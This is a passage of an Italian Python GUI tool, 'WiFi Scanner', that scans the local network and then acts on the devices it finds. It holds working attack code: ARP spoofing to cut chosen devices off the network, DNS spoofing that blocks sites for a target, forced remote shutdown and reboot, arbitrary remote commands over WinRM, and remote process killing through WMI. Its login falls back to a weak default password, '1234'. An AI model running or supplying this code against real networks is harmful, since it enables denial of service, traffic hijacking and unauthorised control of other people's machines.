                        while blocco_siti_active[0]:
                            sendp(pt, iface=iface, verbose=0)
                            sendp(pg, iface=iface, verbose=0)
                            import time; time.sleep(1.5)
                    threading.Thread(target=spoof, daemon=True).start()

                    # DNS blocco siti specifici
                    def dns_blocco(pkt):
                        if not blocco_siti_active[0]: return
                        if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
                            qname = pkt[DNSQR].qname.decode().rstrip(".")
                            for sito in siti_bloccati:
                                if sito in qname:
                                    # rispondi con IP 0.0.0.0 = sito bloccato
                                    spoofed = (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                                              UDP(dport=pkt[UDP].sport, sport=53) /
                                              DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                                  an=DNSRR(rrname=pkt[DNSQR].qname,
                                                           ttl=10, rdata="0.0.0.0")))
                                    from scapy.all import send
                                    send(spoofed, verbose=0)
                                    status.configure(text=f"Bloccato: {qname}", fg=RED)
                                    return

                    sniff(filter=f"udp port 53 and host {ip}",
                          prn=dns_blocco, store=0,
                          stop_filter=lambda x: not blocco_siti_active[0])

                except Exception as e:
                    status.configure(text=f"Errore: {str(e)[:50]}", fg=RED)

            blocco_siti_active[0] = True
            threading.Thread(target=blocco_thread_fn, daemon=True).start()
            blocco_siti_btn.configure(text="⛔  FERMA BLOCCO", fg=MUTED)
            status.configure(text=f"Blocco attivo: {', '.join(siti_bloccati)}", fg=GREEN)

        blocco_siti_btn = tk.Button(siti_frame, text="🚫  BLOCCA SITI",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=toggle_blocco_siti)
        blocco_siti_btn.pack(side="left")

        # ── POPUP WINDOWS ──
        tk.Label(win, text="POPUP WINDOWS", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))
        r3 = tk.Frame(win, bg=BG); r3.pack(pady=4)

        popup_msg = tk.Entry(r3, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                             insertbackground=TEXT, relief="flat", bd=4, width=28)
        popup_msg.insert(0, "Ciao!")
        popup_msg.pack(side="left", padx=(0,6))

        def do_popup():
            msg = popup_msg.get().strip()
            if not msg:
                status.configure(text="Scrivi un messaggio!", fg=RED)
                return
            try:
                subprocess.run(["net", "send", ip, msg], capture_output=True)
                # metodo alternativo via PowerShell remoto
                subprocess.run(["powershell", "-Command",
                    f'[System.Windows.MessageBox]::Show("{msg}")'],
                    capture_output=True)
                status.configure(text=f"Popup inviato a {ip}!", fg=GREEN)
            except Exception as e:
                status.configure(text=f"Errore: {e}", fg=RED)

        tk.Button(r3, text="💬  INVIA POPUP",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_popup).pack(side="left")

        # ── CARTELLE CONDIVISE ──
        tk.Label(win, text="CARTELLE CONDIVISE WINDOWS", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))
        r4 = tk.Frame(win, bg=BG); r4.pack(pady=4)

        def do_smb():
            try:
                subprocess.Popen(["explorer", f"\\{ip}"])
                status.configure(text=f"Aperto explorer su {ip}!", fg=GREEN)
            except Exception as e:
                status.configure(text=f"Errore: {e}", fg=RED)

        def do_shutdown_remote():
            if messagebox.askyesno("Conferma", f"Spegnere il PC {ip}?\nFunziona solo su Windows con condivisione admin attiva."):
                try:
                    r = subprocess.run(["shutdown", "/m", f"\\{ip}", "/s", "/t", "0", "/f"],
                                      capture_output=True, text=True)
                    if r.returncode == 0:
                        status.configure(text=f"Comando spegnimento inviato a {ip}!", fg=GREEN)
                    else:
                        status.configure(text=f"Errore: {r.stderr.strip()[:60]}", fg=RED)
                except Exception as e:
                    status.configure(text=f"Errore: {e}", fg=RED)

        def do_reboot_remote():
            if messagebox.askyesno("Conferma", f"Riavviare il PC {ip}?"):
                try:
                    r = subprocess.run(["shutdown", "/m", f"\\{ip}", "/r", "/t", "0", "/f"],
                                      capture_output=True, text=True)
                    if r.returncode == 0:
                        status.configure(text=f"Riavvio inviato a {ip}!", fg=GREEN)
                    else:
                        status.configure(text=f"Errore: {r.stderr.strip()[:60]}", fg=RED)
                except Exception as e:
                    status.configure(text=f"Errore: {e}", fg=RED)

        tk.Button(r4, text="⚡  SPEGNI PC",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=do_shutdown_remote).pack(side="left", padx=4)

        tk.Button(r4, text="🔄  RIAVVIA PC",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=do_reboot_remote).pack(side="left", padx=4)

        tk.Button(r4, text="📁  APRI CARTELLE",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_smb).pack(side="left", padx=4)

        status.pack(pady=10)
        tk.Button(win, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=win.destroy).pack()

    def _windows_remote(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        ip = self.tree.item(sel[0])["values"][0]
        tags = self.tree.item(sel[0])["tags"]
        if tags and tags[0] == "self":
            if not messagebox.askyesno("Attenzione", "Questo e il tuo PC!\nVuoi comunque aprire Windows Remote su te stesso?"):
                return

        win = tk.Toplevel()
        win.title(f"Windows Remote — {ip}")
        win.geometry("560x580")
        win.configure(bg=BG)
        win.resizable(False, False)

        tk.Label(win, text="WINDOWS REMOTE", font=("Courier New", 14, "bold"),
                 bg=BG, fg=ACCENT).pack(pady=(16,2))
        tk.Label(win, text=f"Target: {ip}",
                 font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)

        # credenziali
        tk.Label(win, text="CREDENZIALI", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack()
        cred_frame = tk.Frame(win, bg=BG); cred_frame.pack(pady=4, padx=24, fill="x")

        tk.Label(cred_frame, text="Utente:", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=0, column=0, sticky="w", pady=3)
        user_entry = tk.Entry(cred_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                              insertbackground=TEXT, relief="flat", bd=4, width=20)
        user_entry.grid(row=0, column=1, padx=8, pady=3)
        user_entry.insert(0, "Administrator")

        tk.Label(cred_frame, text="Password:", font=("Courier New", 9), bg=BG, fg=MUTED).grid(row=1, column=0, sticky="w", pady=3)
        pass_entry = tk.Entry(cred_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                              insertbackground=TEXT, relief="flat", bd=4, width=20, show="●")
        pass_entry.grid(row=1, column=1, padx=8, pady=3)

        status = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=MUTED)

        tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=8)

        is_local = (ip == self._get_local_ip() or ip == "127.0.0.1")

        def get_wmi():
            try:
                import wmi
                if is_local:
                    return wmi.WMI()  # locale senza credenziali
                u = user_entry.get().strip()
                p = pass_entry.get().strip()
                if u and p:
                    return wmi.WMI(ip, user=u, password=p)
                else:
                    return wmi.WMI(ip)
            except ImportError:
                messagebox.showerror("Errore", "Installa wmi: pip install wmi")
                return None
            except Exception as e:
                messagebox.showerror("Errore connessione", str(e)[:150])
                return None

        # ── PROCESSI ──
        tk.Label(win, text="PROCESSI REMOTI", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack()

        proc_frame = tk.Frame(win, bg=BG); proc_frame.pack(pady=4, padx=24, fill="x")

        def lista_processi():
            c = get_wmi()
            if not c: return
            win2 = tk.Toplevel(win)
            win2.title(f"Processi — {ip}")
            win2.geometry("560x500")
            win2.configure(bg=BG)

            tk.Label(win2, text="PROCESSI IN ESECUZIONE",
                     font=("Courier New", 11, "bold"), bg=BG, fg=ACCENT).pack(pady=8)

            search_var = tk.StringVar()
            tk.Entry(win2, textvariable=search_var, font=("Courier New", 10),
                     bg=SURFACE, fg=TEXT, insertbackground=TEXT,
                     relief="flat", bd=4).pack(fill="x", padx=16)

            from tkinter import ttk as ttk2
            cols = ("pid", "nome", "memoria")
            tree2 = ttk2.Treeview(win2, columns=cols, show="headings", selectmode="browse")
            tree2.heading("pid",    text="PID")
            tree2.heading("nome",   text="PROCESSO")
            tree2.heading("memoria",text="MEMORIA (MB)")
            tree2.column("pid",     width=80)
            tree2.column("nome",    width=280)
            tree2.column("memoria", width=120)
            tree2.pack(fill="both", expand=True, padx=16, pady=6)

            procs = []
            try:
                for p in c.Win32_Process():
                    mem = round((p.WorkingSetSize or 0) / 1024 / 1024, 1)
                    procs.append((str(p.ProcessId), p.Name or "?", str(mem)))
            except Exception as e:
                messagebox.showerror("Errore", str(e)[:100])
                return

            procs.sort(key=lambda x: float(x[2]), reverse=True)

            def aggiorna(*args):
                tree2.delete(*tree2.get_children())
                filtro = search_var.get().lower()
                for pid, nome, mem in procs:
                    if filtro in nome.lower():
                        tree2.insert("", "end", values=(pid, nome, mem))

            search_var.trace("w", aggiorna)
            aggiorna()

            def kill_proc():
                sel2 = tree2.selection()
                if not sel2: return
                pid = tree2.item(sel2[0])["values"][0]
                nome = tree2.item(sel2[0])["values"][1]
                if messagebox.askyesno("Conferma", f"Terminare {nome} (PID {pid})?"):
                    try:
                        for p in c.Win32_Process(ProcessId=int(pid)):
                            p.Terminate()
                        messagebox.showinfo("OK", f"{nome} terminato!")
                        aggiorna()
                    except Exception as e:
                        messagebox.showerror("Errore", str(e)[:100])

            tk.Button(win2, text="🗑  TERMINA PROCESSO",
                      font=("Courier New", 10, "bold"),
                      bg=RED, fg=BG, relief="flat", padx=16, pady=6,
                      cursor="hand2", command=kill_proc).pack(pady=4)

        tk.Button(proc_frame, text="📋  LISTA PROCESSI",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=ACCENT, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=lista_processi).pack(side="left", padx=3)

        # ── COMANDI POWERSHELL ──
        tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=8)
        tk.Label(win, text="ESEGUI COMANDO", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack()

        cmd_frame = tk.Frame(win, bg=BG); cmd_frame.pack(pady=4, padx=24, fill="x")
        cmd_entry = tk.Entry(cmd_frame, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                             insertbackground=TEXT, relief="flat", bd=4, width=30)
        cmd_entry.insert(0, "ipconfig")
        cmd_entry.pack(side="left", padx=(0,6))

        def esegui_cmd():
            cmd = cmd_entry.get().strip()
            if not cmd: return
            try:
                if is_local:
                    # esegui localmente senza winrm
                    r2 = subprocess.run(cmd, shell=True, capture_output=True)
                    out = r2.stdout.decode("cp850", errors="replace") or r2.stderr.decode("cp850", errors="replace")
                else:
                    import winrm
                    u = user_entry.get().strip()
                    p = pass_entry.get().strip()
                    s = winrm.Session(ip, auth=(u, p))
                    r2 = s.run_cmd(cmd)
                    out = r2.std_out.decode("cp850", errors="replace") or r2.std_err.decode("cp850", errors="replace")
                win3 = tk.Toplevel(win)
                win3.title(f"Output — {cmd}")
                win3.geometry("600x400")
                win3.configure(bg=BG)
                from tkinter import scrolledtext as st
                txt = st.ScrolledText(win3, font=("Courier New", 9), bg=SURFACE, fg=GREEN)
                txt.pack(fill="both", expand=True, padx=10, pady=10)
                txt.insert("end", out)
            except ImportError:
                messagebox.showerror("Errore", "Installa winrm: pip install pywinrm")
            except Exception as e:
                messagebox.showerror("Errore", str(e)[:150])

        tk.Button(cmd_frame, text="▶  ESEGUI",
                  font=("Courier New", 10, "bold"),
                  bg=GREEN, fg=BG, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=esegui_cmd).pack(side="left")

        # comandi rapidi
        tk.Label(win, text="COMANDI RAPIDI", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(8,0))
        quick_frame = tk.Frame(win, bg=BG); quick_frame.pack(pady=4)

        cmds = [
            ("💻 Info PC",    "systeminfo"),
            ("📋 Processi",   "tasklist"),
            ("🌐 Rete",       "ipconfig /all"),
            ("👤 Utenti",     "net user"),
            ("📁 Condivisioni","net share"),
            ("🔌 Servizi",    "net start"),
        ]
        for i, (label, cmd) in enumerate(cmds):
            tk.Button(quick_frame, text=label,
                      font=("Courier New", 9),
                      bg=SURFACE, fg=TEXT, relief="flat", padx=8, pady=4,
                      cursor="hand2",
                      command=lambda c=cmd: [cmd_entry.delete(0,"end"),
                                              cmd_entry.insert(0,c)]).grid(
                row=i//3, column=i%3, padx=4, pady=3)

        status.pack(pady=6)
        tk.Button(win, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=win.destroy).pack(pady=(0,10))

    def _toggle_block(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        item = sel[0]
        vals = list(self.tree.item(item)["values"])
        ip   = vals[0]
        tags = self.tree.item(item)["tags"]
        tag  = tags[0] if tags else ""
        if tag == "self":
            messagebox.showwarning("Attenzione", "Non puoi bloccare il tuo stesso PC!")
            return
        if ip in blocked_threads:
            blocked_threads[ip]["stop"].set()
            blocked_threads.pop(ip, None)
            vals[3] = "online"; vals[4] = "—"
            self.tree.item(item, values=vals, tags=("online",))
            self.block_btn.configure(text="🔴  BLOCCA", fg=RED)
            self._set_status(f"Sbloccato: {ip}", GREEN)
        else:
            gw = get_gateway()
            if not gw:
                messagebox.showerror("Errore", "Impossibile rilevare il gateway.")
                return
            stop_event = threading.Event()
            t = threading.Thread(target=arp_spoof_loop, args=(ip, gw, stop_event), daemon=True)
            t.start()
            blocked_threads[ip] = {"stop": stop_event, "thread": t}
            vals[3] = "BLOCCATO"; vals[4] = "●"
            self.tree.item(item, values=vals, tags=("blocked",))
            self.block_btn.configure(text="🟢  SBLOCCA", fg=GREEN)
            self._set_status(f"Bloccato: {ip}", RED)

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def _get_subnet(self, ip):
        return ".".join(ip.split(".")[:3]) + ".0/24"

    def _arp_scan(self, subnet):
        devices = {}
        my_ip = self._get_local_ip()
        base = ".".join(subnet.split(".")[:3])
        # ping parallelo con semaforo per non sovraccaricare
        sem = threading.Semaphore(50)
        done = [0]
        total = 254
        def ping(ip):
            with sem:
                subprocess.run(["ping", "-n", "1", "-w", "500", ip], capture_output=True)
                done[0] += 1
                pct = int(done[0] / total * 100)
                try:
                    self.after(0, lambda p=pct: self.progress.configure(value=p))
                except: pass
        threads = []
        for i in range(1, 255):
            t = threading.Thread(target=ping, args=(f"{base}.{i}",), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        arp = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in arp.stdout.splitlines():
            m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]{17})", line)
            if m:
                ip, mac = m.group(1), m.group(2).upper()
                if "FF-FF-FF-FF-FF-FF" in mac:
                    continue
                is_blocked = ip in blocked_threads
                tag = "blocked" if is_blocked else ("self" if ip == my_ip else "online")
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "—"
                devices[ip] = {"ip": ip, "hostname": hostname, "mac": mac,
                               "stato": "BLOCCATO" if is_blocked else "online",
                               "blocco": "●" if is_blocked else "—", "tag": tag}
        if my_ip and my_ip not in devices:
            try:
                hostname = socket.gethostname()
            except:
                hostname = "questo PC"
            devices[my_ip] = {"ip": my_ip, "hostname": hostname, "mac": "—",
                               "stato": "online", "blocco": "—", "tag": "self"}
        return list(devices.values())

    def _start_scan(self):
        self.scan_btn.configure(state="disabled")
        self.progress.configure(value=0)
        self._set_status("scansione in corso...", YELLOW)
        for row in self.tree.get_children():
            self.tree.delete(row)
        threading.Thread(target=self._scan_thread, daemon=True).start()

    def _scan_thread(self):
        my_ip = self._get_local_ip()
        if not my_ip:
            self.after(0, lambda: self._scan_done([], error="Nessuna connessione rilevata"))
            return
        subnet = self._get_subnet(my_ip)
        self.after(0, lambda: self.subnet_lbl.configure(
            text=f"Rete locale: {subnet}  |  Il tuo IP: {my_ip}"))
        devices = self._arp_scan(subnet)
        self.devices = devices
        self.after(0, lambda: self._scan_done(devices))

    def _scan_done(self, devices, error=None):
        self.progress.configure(value=100)
        self.scan_btn.configure(state="normal")
        self.time_lbl.configure(text=f"Ultima scansione: {datetime.now().strftime('%H:%M:%S')}")
        if error:
            self._set_status(error, RED)
            return
        devices.sort(key=lambda d: list(map(int, d["ip"].split("."))))
        for d in devices:
            stato_icon = "🟢 online" if d["stato"] == "online" else "🔴 BLOCCATO"
            self.tree.insert("", "end",
                             values=(d["ip"], d["hostname"], d["mac"], stato_icon, d["blocco"]),
                             tags=(d["tag"],))
        n = len(devices)
        self.count_lbl.configure(text=f"{n} dispositiv{'o' if n==1 else 'i'} trovati")
        self._set_status("scansione completata", GREEN)

    def _set_status(self, text, color):
        self.status_lbl.configure(text=text, fg=color)
        self.status_dot.configure(fg=color)

    def _export(self):
        if not self.devices:
            messagebox.showinfo("Nessun dato", "Esegui prima una scansione.")
            return
        path = os.path.join(os.path.expanduser("~"), "Desktop", "wifi_scan.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"WiFi Scanner — {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            for d in self.devices:
                f.write(f"IP:       {d['ip']}\n")
                f.write(f"Hostname: {d['hostname']}\n")
                f.write(f"MAC:      {d['mac']}\n")
                f.write(f"Stato:    {d['stato']}\n")
                f.write("-" * 40 + "\n")
        messagebox.showinfo("Esportato", f"File salvato in:\n{path}")

    def on_close(self):
        for data in blocked_threads.values():
            data["stop"].set()
        self.destroy()

import hashlib
import json

PWD_FILE = os.path.join(os.path.expanduser("~"), ".wifiscanner_pwd")

def get_pwd_hash():
    try:
        with open(PWD_FILE, "r") as f:
            return json.load(f)["hash"]
    except:
        # password default 1234
        return hashlib.sha256("1234".encode()).hexdigest()

def save_pwd_hash(h):
    with open(PWD_FILE, "w") as f:
        json.dump({"hash": h}, f)

def hash_pwd(p):
    return hashlib.sha256(p.encode()).hexdigest()

def login():
    win = tk.Tk()
    win.title("WiFi Scanner — Accesso")
    win.geometry("360x280")
    win.configure(bg=BG)
    win.resizable(False, False)

    result = [False]

    tk.Label(win, text="WIFI SCANNER", font=("Courier New", 18, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(30, 4))
    tk.Label(win, text="Inserisci password",
             font=("Courier New", 10), bg=BG, fg=MUTED).pack()

    tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=12)

    pwd_entry = tk.Entry(win, font=("Courier New", 12), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=6,
                         show="●", width=20)
    pwd_entry.pack(pady=8)
    pwd_entry.focus()

    err_lbl = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=RED)
    err_lbl.pack()

    def do_login(e=None):
        if hash_pwd(pwd_entry.get()) == get_pwd_hash():
            result[0] = True
            win.destroy()
        else:
            err_lbl.configure(text="Password errata!")
            pwd_entry.delete(0, "end")

    pwd_entry.bind("<Return>", do_login)

    tk.Button(win, text="ACCEDI", font=("Courier New", 11, "bold"),
              bg=ACCENT, fg=BG, relief="flat", padx=20, pady=6,
              cursor="hand2", command=do_login).pack(pady=8)

    win.mainloop()
    return result[0]

def cambia_password_dialog():
    win = tk.Toplevel()
    win.title("Cambia Password")
    win.geometry("360x300")
    win.configure(bg=BG)
    win.resizable(False, False)
    win.grab_set()

    tk.Label(win, text="CAMBIA PASSWORD", font=("Courier New", 13, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(20, 4))

    form = tk.Frame(win, bg=BG)
    form.pack(padx=24, fill="x", pady=8)

    tk.Label(form, text="Password attuale", font=("Courier New", 9), bg=BG, fg=MUTED).pack(anchor="w")
    old_entry = tk.Entry(form, font=("Courier New", 11), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4, show="●")
    old_entry.pack(fill="x", pady=(0,8))

    tk.Label(form, text="Nuova password", font=("Courier New", 9), bg=BG, fg=MUTED).pack(anchor="w")
    new_entry = tk.Entry(form, font=("Courier New", 11), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4, show="●")
    new_entry.pack(fill="x", pady=(0,8))

    tk.Label(form, text="Conferma nuova password", font=("Courier New", 9), bg=BG, fg=MUTED).pack(anchor="w")
    conf_entry = tk.Entry(form, font=("Courier New", 11), bg=SURFACE, fg=TEXT,
                          insertbackground=TEXT, relief="flat", bd=4, show="●")
    conf_entry.pack(fill="x")

    err_lbl = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=RED)
    err_lbl.pack(pady=4)

    def do_cambia():
        if hash_pwd(old_entry.get()) != get_pwd_hash():
            err_lbl.configure(text="Password attuale errata!", fg=RED)
            return
        if new_entry.get() != conf_entry.get():
            err_lbl.configure(text="Le password non coincidono!", fg=RED)
            return
        if len(new_entry.get()) < 4:
            err_lbl.configure(text="Password troppo corta (min 4)!", fg=RED)
            return
        save_pwd_hash(hash_pwd(new_entry.get()))
        err_lbl.configure(text="Password cambiata!", fg=GREEN)
        win.after(1000, win.destroy)

    tk.Button(win, text="SALVA", font=("Courier New", 11, "bold"),
              bg=GREEN, fg=BG, relief="flat", padx=20, pady=6,
              cursor="hand2", command=do_cambia).pack()

def adb_auto_reconnect():
    """Tenta riconnessione adb in background ogni 10 secondi"""
    import time
    while True:
        try:
            out = subprocess.run([ADB_PATH, "devices"], capture_output=True, text=True).stdout
            if "offline" in out:
                # riconnetti tutti i dispositivi offline
                for line in out.splitlines():
                    if "offline" in line:
                        addr = line.split()[0]
                        subprocess.run([ADB_PATH, "reconnect", addr], capture_output=True)
        except: pass
        time.sleep(10)

if __name__ == "__main__":
    if not login():
        exit()
    # avvia auto-reconnect in background
    threading.Thread(target=adb_auto_reconnect, daemon=True).start()
    app = WifiScanner()
    # aggiungi voce cambia password nel menu
    menubar = tk.Menu(app)
    settingsmenu = tk.Menu(menubar, tearoff=0)
    settingsmenu.add_command(label="Cambia password", command=cambia_password_dialog)
    menubar.add_cascade(label="Impostazioni", menu=settingsmenu)
    app.configure(menu=menubar)
    app.protocol("WM_DELETE_WINDOW", app.on_close)
    app.mainloop()
